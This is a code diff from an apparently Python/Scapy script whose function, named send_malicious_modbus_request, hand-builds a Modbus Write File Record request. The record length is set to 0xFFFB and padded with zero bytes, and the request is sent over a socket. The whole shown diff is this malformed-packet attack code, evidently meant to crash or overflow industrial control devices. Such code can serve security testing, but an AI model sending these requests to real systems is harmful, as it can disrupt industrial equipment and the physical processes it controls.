@@ -7,15 +7,18 @@ logging.basicConfig(level=logging.DEBUG)
 
 def send_malicious_modbus_request():
     try:
-        record = ModbusFileRecord(
-            referenceType=6,
-            fileNumber=0,
-            recordNumber=0,
-            recordLength=0xFFFB,
-            recordData=b'\x00' * 0xFFFB
-        )
-        
-        modbus_request = ModbusADURequest(transId=1, protoId=0, len=7 + len(record), unitId=1) / ModbusPDU15WriteFileRecordRequest(records=[record])
+        # 手動構建寫文件記錄的數據
+        reference_type = 6
+        file_number = 0
+        record_number = 0
+        record_length = 0xFFFB
+        record_data = b'\x00' * record_length
+
+        # 組合成完整的Modbus PDU
+        modbus_pdu = struct.pack('!BBHHH', reference_type, file_number, record_number, record_length, len(record_data)) + record_data
+
+        # 構建Modbus ADU請求
+        modbus_request = ModbusADURequest(transId=1, protoId=0, len=7 + len(modbus_pdu), unitId=1) / Raw(modbus_pdu)
         request_data = bytes(modbus_request)
         
         # 使用socket發送請求
